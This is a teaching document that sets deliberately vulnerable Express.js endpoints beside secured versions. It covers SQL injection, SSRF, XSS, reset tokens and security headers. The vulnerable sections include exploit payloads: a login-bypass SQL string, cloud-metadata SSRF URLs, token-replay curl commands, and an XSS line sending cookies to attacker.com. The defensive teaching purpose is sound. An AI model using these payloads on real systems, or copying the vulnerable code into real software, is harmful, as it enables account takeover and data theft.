# Code Comparison: Vulnerable vs Secure

A side-by-side comparison of vulnerable and secure implementations.

---

## 1. SQL Injection Protection

### ❌ VULNERABLE CODE
```javascript
// vulnerable-app/backend/server.js

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // 🚨 VULNERABLE: String concatenation allows SQL injection
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  
  db.get(query, (err, user) => {
    if (err) {
      // 🚨 VULNERABLE: Exposing error details
      return res.status(500).json({ 
        error: err.message,
        stack: err.stack,
        query: query  // 🚨 Leaking query structure
      });
    }
    
    if (user) {
      res.json({ success: true, user: user });
    } else {
      res.status(401).json({ error: 'Invalid credentials' });
    }
  });
});
```

**How to exploit:**
```
Username: admin' OR '1'='1'--
Password: anything
```

### ✅ SECURE CODE
```javascript
// secure-app/backend/server.js

app.post('/api/login', 
  authLimiter,  // ✅ Rate limiting
  validateInput({  // ✅ Input validation
    username: { required: true, maxLength: 50 },
    password: { required: true, maxLength: 100 }
  }),
  async (req, res) => {
    try {
      const { username, password } = req.body;
      
      // ✅ SECURE: Parameterized query prevents SQL injection
      const user = await runSingleQuery(
        'SELECT * FROM users WHERE username = ?',
        [username]  // ✅ Parameters are automatically escaped
      );
      
      if (!user) {
        // ✅ Generic error message
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      
      // ✅ SECURE: Password comparison using bcrypt
      const validPassword = await bcrypt.compare(password, user.password_hash);
      
      if (!validPassword) {
        return res.status(401).json({ error: 'Invalid credentials' });
      }
      
      // ✅ Don't send sensitive data to client
      delete user.password_hash;
      
      res.json({ success: true, user: user });
    } catch (error) {
      // ✅ SECURE: Generic error, detailed logs server-side only
      console.error('Login error:', error);
      res.status(500).json({ error: 'An error occurred during login' });
    }
  }
);
```

**Security improvements:**
- ✅ Parameterized queries prevent SQL injection
- ✅ Password hashing with bcrypt
- ✅ Rate limiting prevents brute force
- ✅ Input validation
- ✅ Generic error messages
- ✅ No sensitive data in responses

---

## 2. SSRF Protection

### ❌ VULNERABLE CODE
```javascript
// vulnerable-app/backend/server.js

app.post('/api/import-github', async (req, res) => {
  const { url, userId } = req.body;
  
  try {
    // 🚨 VULNERABLE: No URL validation whatsoever
    console.log('Fetching URL:', url);
    
    const response = await axios.get(url, {
      timeout: 5000,
      maxRedirects: 5,  // 🚨 Follows redirects (can be exploited)
    });
    
    // 🚨 Stores any URL without validation
    db.run(
      `INSERT INTO repositories (user_id, url, name) VALUES (${userId}, '${url}', 'imported-repo')`,
      // 🚨 Also vulnerable to SQL injection!
    );
    
    // 🚨 Returns full response including headers
    res.json({ 
      success: true, 
      data: response.data,
      headers: response.headers,  // 🚨 Information disclosure
      statusCode: response.status
    });
  } catch (error) {
    // 🚨 Exposes detailed error information
    res.status(500).json({ 
      error: 'Failed to fetch repository',
      message: error.message,
      stack: error.stack,
      config: error.config,
      url: url
    });
  }
});
```

**How to exploit:**
```bash
# Access internal services
URL: http://localhost:3000/api/debug/info

# Cloud metadata
URL: http://169.254.169.254/latest/meta-data/

# Port scanning
URL: http://127.0.0.1:3306
```

### ✅ SECURE CODE
```javascript
// secure-app/backend/server.js

app.post('/api/import-github',
  validateInput({
    url: { required: true, type: 'url' },
    userId: { required: true }
  }),
  async (req, res) => {
    try {
      const { url, userId } = req.body;
      
      // ✅ SECURE: Whitelist allowed domains
      const allowedDomains = ['api.github.com', 'github.com'];
      const urlObj = new URL(url);
      
      if (!allowedDomains.includes(urlObj.hostname)) {
        return res.status(400).json({ 
          error: 'Invalid URL. Only GitHub URLs are allowed.' 
        });
      }
      
      // ✅ SECURE: Block private IP ranges
      const privateIPRegex = /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|169\.254\.)/;
      if (privateIPRegex.test(urlObj.hostname)) {
        return res.status(400).json({ error: 'Access to private IPs is forbidden' });
      }
      
      // ✅ SECURE: Strict request configuration
      const response = await axios.get(url, {
        timeout: 5000,
        maxRedirects: 0,  // ✅ No redirects
        maxContentLength: 1024 * 1024,  // ✅ 1MB limit
        validateStatus: (status) => status === 200  // ✅ Only accept 200 OK
      });
      
      // ✅ SECURE: Parameterized query
      await runUpdate(
        'INSERT INTO repositories (user_id, url, name) VALUES (?, ?, ?)',
        [userId, url, 'imported-repo']
      );
      
      // ✅ SECURE: Minimal response, no sensitive data
      res.json({ 
        success: true,
        message: 'Repository imported successfully',
        name: response.data.name || 'Unknown'
      });
    } catch (error) {
      // ✅ SECURE: Generic error message
      console.error('Import error:', error);
      res.status(500).json({ error: 'Failed to import repository' });
    }
  }
);
```

**Security improvements:**
- ✅ URL whitelist (only GitHub domains)
- ✅ Private IP blocking
- ✅ Localhost access denied
- ✅ No redirect following
- ✅ Response size limits
- ✅ Generic error messages
- ✅ Parameterized database queries

---

## 3. XSS Protection

### ❌ VULNERABLE CODE
```javascript
// vulnerable-app/backend/server.js

app.post('/api/users/:id/bio', (req, res) => {
  const { id } = req.params;
  const { bio } = req.body;
  
  // 🚨 VULNERABLE: No input sanitization
  const query = `UPDATE users SET bio = '${bio}' WHERE id = ${id}`;
  
  db.run(query, (err) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    // 🚨 Returns unsanitized bio
    res.json({ success: true, bio: bio });
  });
});

app.get('/api/users/:id', (req, res) => {
  const { id } = req.params;
  
  // 🚨 SQL injection in ID parameter
  const query = `SELECT * FROM users WHERE id = ${id}`;
  
  db.get(query, (err, user) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    // 🚨 Returns bio with potential XSS payload
    res.json(user);
  });
});
```

```javascript
// vulnerable-app/frontend/app.js

async function viewProfile(event) {
  // ...
  const user = await response.json();
  
  // 🚨 VULNERABLE: Direct HTML rendering without sanitization
  document.getElementById('profile-result').innerHTML = `
    <strong>User Profile:</strong><br>
    <strong>Bio:</strong><br>
    <div>
      ${user.bio}  <!-- 🚨 XSS executes here! -->
    </div>
  `;
}
```

**How to exploit:**
```html
Bio: <script>alert(document.cookie)</script>
Bio: <img src=x onerror=alert('XSS')>
Bio: <svg onload=fetch('http://attacker.com/steal?c='+document.cookie)>
```

### ✅ SECURE CODE
```javascript
// secure-app/backend/server.js

const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const purify = DOMPurify(window);

app.post('/api/users/:id/bio',
  validateInput({
    bio: { required: true, maxLength: 500 }
  }),
  async (req, res) => {
    try {
      const { id } = req.params;
      const { bio } = req.body;
      
      // ✅ SECURE: Sanitize HTML to prevent XSS
      const sanitizedBio = purify.sanitize(bio, { 
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []  // ✅ No attributes allowed
      });
      
      // ✅ SECURE: Parameterized query
      await runUpdate(
        'UPDATE users SET bio = ? WHERE id = ?',
        [sanitizedBio, id]
      );
      
      res.json({ 
        success: true, 
        bio: sanitizedBio  // ✅ Returns sanitized version
      });
    } catch (error) {
      res.status(500).json({ error: 'Failed to update bio' });
    }
  }
);

app.get('/api/users/:id', async (req, res) => {
  try {
    const { id } = req.params;
    
    // ✅ SECURE: Validate ID is numeric
    if (!/^\d+$/.test(id)) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }
    
    // ✅ SECURE: Parameterized query
    const user = await runSingleQuery(
      'SELECT id, username, email, role, bio FROM users WHERE id = ?',
      [id]
    );
    
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // ✅ Bio is already sanitized in database
    res.json(user);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch user' });
  }
});
```

```javascript
// secure-app/frontend/app.js

async function viewProfile(event) {
  // ...
  const user = await response.json();
  
  if (response.ok && user.id) {
    // ✅ SECURE: Use textContent instead of innerHTML
    const resultDiv = document.getElementById('profile-result');
    resultDiv.textContent = '';  // Clear
    
    const content = document.createElement('div');
    
    // ✅ SECURE: Create text nodes, not HTML
    const bioDiv = document.createElement('div');
    bioDiv.textContent = `Bio: ${user.bio}`;  // ✅ Prevents XSS
    content.appendChild(bioDiv);
    
    resultDiv.appendChild(content);
  }
}
```

**Security improvements:**
- ✅ Server-side HTML sanitization with DOMPurify
- ✅ Whitelist of allowed HTML tags
- ✅ No dangerous attributes allowed
- ✅ Client-side uses textContent instead of innerHTML
- ✅ Input validation (length limits)
- ✅ Content Security Policy headers
- ✅ Parameterized database queries

---

## 4. Password Reset Token Security

### ❌ VULNERABLE CODE
```javascript
// vulnerable-app/backend/server.js

app.post('/api/request-reset', (req, res) => {
  const { email } = req.body;
  
  // 🚨 SQL injection vulnerability
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  
  db.get(query, (err, user) => {
    if (err || !user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // 🚨 Simple UUID, no expiration
    const token = uuidv4();
    
    // 🚨 Token stored without expiration timestamp
    db.run(
      `INSERT INTO password_resets (user_id, token) VALUES (${user.id}, '${token}')`,
    );
    
    // 🚨 Returns token in response (should be emailed)
    res.json({ 
      success: true, 
      token: token,
      user_id: user.id  // 🚨 Information disclosure
    });
  });
});

app.post('/api/reset-password', (req, res) => {
  const { token, newPassword } = req.body;
  
  // 🚨 No expiration check
  // 🚨 Token not deleted after use (reusable!)
  const query = `SELECT * FROM password_resets WHERE token = '${token}'`;
  
  db.get(query, (err, reset) => {
    if (err || !reset) {
      return res.status(400).json({ error: 'Invalid token' });
    }
    
    // 🚨 Plain text password storage
    db.run(
      `UPDATE users SET password = '${newPassword}' WHERE id = ${reset.user_id}`,
    );
    
    // 🚨 Token still valid!
    res.json({ 
      success: true,
      token: token  // 🚨 Sending back still-valid token
    });
  });
});
```

**How to exploit:**
```bash
# 1. Request a token
curl -X POST http://localhost:3000/api/request-reset \
  -d '{"email":"admin@vulnerable.local"}'

# Response: { "token": "abc-123-xyz" }

# 2. Use the token multiple times
curl -X POST http://localhost:3000/api/reset-password \
  -d '{"token":"abc-123-xyz","newPassword":"hacked1"}'

# Token still works!
curl -X POST http://localhost:3000/api/reset-password \
  -d '{"token":"abc-123-xyz","newPassword":"hacked2"}'

# Token works forever!
```

### ✅ SECURE CODE
```javascript
// secure-app/backend/server.js

const bcrypt = require('bcrypt');
const crypto = require('crypto');

app.post('/api/request-reset',
  authLimiter,
  validateInput({
    email: { required: true, type: 'email' }
  }),
  async (req, res) => {
    try {
      const { email } = req.body;
      
      // ✅ SECURE: Parameterized query
      const user = await runSingleQuery(
        'SELECT * FROM users WHERE email = ?',
        [email]
      );
      
      // ✅ SECURE: Don't reveal if email exists
      if (!user) {
        return res.json({ 
          success: true, 
          message: 'If the email exists, a reset link has been sent.' 
        });
      }
      
      // ✅ SECURE: Cryptographically secure token
      const token = crypto.randomBytes(32).toString('hex');
      
      // ✅ SECURE: 1-hour expiration
      const expiresAt = new Date(Date.now() + 3600000);
      
      await runUpdate(
        'INSERT INTO password_resets (user_id, token, expires_at, used) VALUES (?, ?, ?, 0)',
        [user.id, token, expiresAt.toISOString()]
      );
      
      // In production, send via email
      res.json({ 
        success: true, 
        message: 'If the email exists, a reset link has been sent.',
        // Demo only:
        token: token,
        expiresAt: expiresAt
      });
    } catch (error) {
      res.status(500).json({ error: 'An error occurred' });
    }
  }
);

app.post('/api/reset-password',
  authLimiter,
  validateInput({
    token: { required: true },
    newPassword: { required: true, minLength: 8, maxLength: 100 }
  }),
  async (req, res) => {
    try {
      const { token, newPassword } = req.body;
      
      // ✅ SECURE: Check token and used status
      const reset = await runSingleQuery(
        'SELECT * FROM password_resets WHERE token = ? AND used = 0',
        [token]
      );
      
      if (!reset) {
        return res.status(400).json({ error: 'Invalid or already used token' });
      }
      
      // ✅ SECURE: Check expiration
      const now = new Date();
      const expiresAt = new Date(reset.expires_at);
      
      if (now > expiresAt) {
        return res.status(400).json({ error: 'Token has expired' });
      }
      
      // ✅ SECURE: Hash password with bcrypt
      const passwordHash = await bcrypt.hash(newPassword, 10);
      
      // ✅ SECURE: Update password
      await runUpdate(
        'UPDATE users SET password_hash = ? WHERE id = ?',
        [passwordHash, reset.user_id]
      );
      
      // ✅ SECURE: Mark token as used (single-use)
      await runUpdate(
        'UPDATE password_resets SET used = 1 WHERE token = ?',
        [token]
      );
      
      res.json({ 
        success: true, 
        message: 'Password has been reset successfully' 
      });
    } catch (error) {
      res.status(500).json({ error: 'An error occurred' });
    }
  }
);
```

**Security improvements:**
- ✅ Cryptographically secure token generation
- ✅ 1-hour expiration period
- ✅ Single-use tokens (marked as used)
- ✅ Password hashing with bcrypt
- ✅ Rate limiting (prevents abuse)
- ✅ Generic responses (don't reveal if email exists)
- ✅ Parameterized queries
- ✅ Input validation

---

## 5. Security Headers

### ❌ VULNERABLE CODE
```javascript
// vulnerable-app/backend/server.js

const app = express();

// 🚨 Wide open CORS
app.use(cors());

// 🚨 No security headers
app.use(bodyParser.json());

// Result: Missing critical security headers
```

**Missing headers:**
- Content-Security-Policy
- X-Frame-Options
- Strict-Transport-Security
- X-Content-Type-Options
- Referrer-Policy

### ✅ SECURE CODE
```javascript
// secure-app/backend/server.js

const helmet = require('helmet');

// ✅ SECURE: Use Helmet for security headers
app.use(helmet({
  // ✅ Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  
  // ✅ HTTP Strict Transport Security
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  
  // ✅ X-Frame-Options
  frameguard: {
    action: 'deny'
  },
  
  // ✅ X-Content-Type-Options
  noSniff: true,
  
  // ✅ Referrer-Policy
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  }
}));

// ✅ SECURE: Properly configured CORS
const corsOptions = {
  origin: ['http://localhost:8080'],
  optionsSuccessStatus: 200,
  credentials: true
};
app.use(cors(corsOptions));

// ✅ SECURE: Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);
```

**Security improvements:**
- ✅ Content Security Policy prevents XSS
- ✅ HSTS enforces HTTPS
- ✅ X-Frame-Options prevents clickjacking
- ✅ X-Content-Type-Options prevents MIME sniffing
- ✅ Proper CORS configuration
- ✅ Rate limiting prevents abuse

---

## Summary Table

| Security Control | Vulnerable App | Secure App |
|-----------------|----------------|------------|
| SQL Injection Protection | ❌ String concatenation | ✅ Parameterized queries |
| Password Storage | ❌ Plain text | ✅ Bcrypt hashing |
| SSRF Protection | ❌ No validation | ✅ URL whitelist + IP blocking |
| XSS Protection | ❌ No sanitization | ✅ DOMPurify + textContent |
| Token Security | ❌ Never expires, reusable | ✅ 1-hour expiry, single-use |
| Error Messages | ❌ Detailed stack traces | ✅ Generic messages |
| Security Headers | ❌ None | ✅ Helmet.js (CSP, HSTS, etc.) |
| Rate Limiting | ❌ None | ✅ Express-rate-limit |
| Input Validation | ❌ None | ✅ Comprehensive validation |
| CORS | ❌ Wide open | ✅ Properly configured |

---

## Key Takeaways

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - Prevents SQL injection
3. **Hash passwords** - Never store plain text
4. **Validate URLs** - Prevent SSRF attacks
5. **Sanitize output** - Prevents XSS
6. **Expire tokens** - Time-limited, single-use
7. **Hide details** - Generic error messages
8. **Add headers** - Use Helmet.js
9. **Limit requests** - Prevent brute force
10. **Keep updated** - Regular security patches

---

**Learn from both examples!** Understanding how vulnerabilities work makes you a better defender.
